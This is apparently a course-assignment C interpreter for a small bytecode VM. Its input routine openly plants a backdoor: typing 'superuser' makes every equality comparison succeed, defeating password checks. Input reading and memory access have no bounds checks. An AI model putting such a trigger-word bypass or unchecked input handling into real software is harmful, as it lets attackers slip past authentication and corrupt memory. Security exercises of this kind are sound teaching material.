// This is where you put your VM code.
// I am trying to follow the coding style of the original.

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include "minivm.h"

#define NUM_REGS   (256)
#define NUM_FUNCS  (256)

// Global variable that indicates if the process is running.
static bool is_running = true;
static bool backdoor = false; // Whether the backdoor is open or not.

// 14 Instruction functions
void inst_halt(struct VMContext* ctx __attribute__((unused)), const uint32_t instr __attribute__((unused))){
	exit(0);
}

void inst_load(struct VMContext* ctx, const uint32_t instr){
	const uint8_t b = EXTRACT_B1(instr);
	const uint8_t c = EXTRACT_B2(instr);
	ctx->r[b].value = *(ctx->heap + ctx->r[c].value);
}

void inst_store(struct VMContext* ctx, const uint32_t instr){
	const uint8_t b = EXTRACT_B1(instr);
	const uint8_t c = EXTRACT_B2(instr);
	*(ctx->heap + ctx->r[b].value) = EXTRACT_B0(ctx->r[c].value); 		
}

void inst_move(struct VMContext* ctx, const uint32_t instr){
	const uint8_t b = EXTRACT_B1(instr);
	const uint8_t c = EXTRACT_B2(instr);
	ctx->r[b].value = ctx->r[c].value;
}

void inst_puti(struct VMContext* ctx, const uint32_t instr){
	const uint8_t b = EXTRACT_B1(instr);
	const uint8_t c = EXTRACT_B2(instr);
	ctx->r[b].value = (uint32_t)c;
}

void inst_add(struct VMContext* ctx, const uint32_t instr){
	const uint8_t b = EXTRACT_B1(instr);
	const uint8_t c = EXTRACT_B2(instr);
	const uint8_t d = EXTRACT_B3(instr);
	ctx->r[b].value = ctx->r[c].value + ctx->r[d].value;
}

void inst_sub(struct VMContext* ctx, const uint32_t instr){
	const uint8_t b = EXTRACT_B1(instr);
	const uint8_t c = EXTRACT_B2(instr);
	const uint8_t d = EXTRACT_B3(instr);
	ctx->r[b].value = ctx->r[c].value - ctx->r[d].value;
}

void inst_gt(struct VMContext* ctx, const uint32_t instr){
	const uint8_t b = EXTRACT_B1(instr);
	const uint8_t c = EXTRACT_B2(instr);
	const uint8_t d = EXTRACT_B3(instr);
	if(ctx->r[c].value > ctx->r[d].value)
		ctx->r[b].value = 1;
	else
		ctx->r[b].value = 0;
}

void inst_ge(struct VMContext* ctx, const uint32_t instr){
	const uint8_t b = EXTRACT_B1(instr);
	const uint8_t c = EXTRACT_B2(instr);
	const uint8_t d = EXTRACT_B3(instr);
	if(ctx->r[c].value >= ctx->r[d].value)
		ctx->r[b].value = 1;
	else
		ctx->r[b].value = 0;
}

void inst_eq(struct VMContext* ctx, const uint32_t instr){
	const uint8_t b = EXTRACT_B1(instr);
	const uint8_t c = EXTRACT_B2(instr);
	const uint8_t d = EXTRACT_B3(instr);
	// When a backdoor key word is in, it always return 1 to reg
	if((ctx->r[c].value == ctx->r[d].value) || backdoor)
		ctx->r[b].value = 1;
	else
		ctx->r[b].value = 0;
}

void inst_ite(struct VMContext* ctx, const uint32_t instr){
	const uint8_t b = EXTRACT_B1(instr);
	const uint8_t c = EXTRACT_B2(instr);
	const uint8_t d = EXTRACT_B3(instr);
	if(ctx->r[b].value != 0)
		ctx->instrIdx = c-1;
	else
		ctx->instrIdx = d-1;
}

void inst_jump(struct VMContext* ctx, const uint32_t instr){
	const uint8_t b = EXTRACT_B1(instr);
	ctx->instrIdx = b-1;
}

void inst_puts(struct VMContext* ctx, const uint32_t instr){
	const uint8_t b = EXTRACT_B1(instr);
	uint32_t* addr = (uint32_t*)(ctx->heap + ctx->r[b].value);
	char ch;

	while(true){
		ch = *addr;
		if(ch == '\0')
			break;
		printf("%c", ch);
		addr++;
	}
}

void inst_gets(struct VMContext* ctx, const uint32_t instr){
	const uint8_t b = EXTRACT_B1(instr);
	uint32_t* addr = (uint32_t*)(ctx->heap + ctx->r[b].value);
	char* backdoorKey = "superuser";
	uint8_t idx = 0;
	bool backdoorOpen = true;
	// When a input is 'superuser', eq instr will be 1 always.
	while(true){
		*addr = getc(stdin);
		if(*addr == '\n'){
			*addr = '\0';
			break;
		}
		if((char)*addr != backdoorKey[idx])
			backdoorOpen = false;
		addr++;
		idx++;
	}
	if(backdoorOpen && (idx == 9)){
		backdoor = true;
	}
}



void usageExit() {
    // TODO: show usage
	printf("Usage: ./interpreter <bytecode file>\n");
    exit(1);
}

void initFuncs(FunPtr *f, uint32_t cnt) {
    uint32_t i;
    for (i = 0; i < cnt; i++) {
        f[i] = NULL;
    }
    // TODO: initialize function pointers
    f[0x00] = inst_halt;
    f[0x10] = inst_load;
	f[0x20] = inst_store;
	f[0x30] = inst_move;
	f[0x40] = inst_puti;
	f[0x50] = inst_add;
	f[0x60] = inst_sub;
	f[0x70] = inst_gt;
	f[0x80] = inst_ge;
	f[0x90] = inst_eq;
	f[0xa0] = inst_ite;
	f[0xb0] = inst_jump;
	f[0xc0] = inst_puts;
	f[0xd0] = inst_gets;
}

void initRegs(Reg *r, uint32_t cnt)
{
    uint32_t i;
    for (i = 0; i < cnt; i++) {
        r[i].type = 0;
        r[i].value = 0;
    }
}

int main(int argc, char** argv) {
    VMContext vm;
    Reg r[NUM_REGS];
    FunPtr f[NUM_FUNCS];
    FILE* bytecode;
    uint32_t* pc;

    // There should be at least one argument.
    if (argc < 2) usageExit();

    // Initialize registers.
    initRegs(r, NUM_REGS);
    // Initialize interpretation functions.
    initFuncs(f, NUM_FUNCS);
    // Initialize VM context.
    initVMContext(&vm, NUM_REGS, NUM_FUNCS, r, f);

    // Load bytecode file
    bytecode = fopen(argv[1], "rb");
    if (bytecode == NULL) {
        perror("fopen");
        return 1;
    }

	// Read a input file and set pc
	uint32_t len;
	fseek(bytecode, 0, SEEK_END);
	len = ftell(bytecode);
	pc = (uint32_t*)malloc(len);
	fseek(bytecode, 0, SEEK_SET);
    fread(pc, 4, len/4, bytecode);

	while (is_running) {
        // TODO: Read 4-byte bytecode, and set the pc accordingly
		// If instruction index is out of the bound with jump, it terminate
		if(vm.instrIdx > len/4){
			perror("An instruction index is out of the boundary\n");
			free(pc);
			fclose(bytecode);
			return 1;
		}
		stepVMContext(&vm, &pc);
    }

	free(pc);
    fclose(bytecode);

    // Zero indicates normal termination.
    return 0;
}
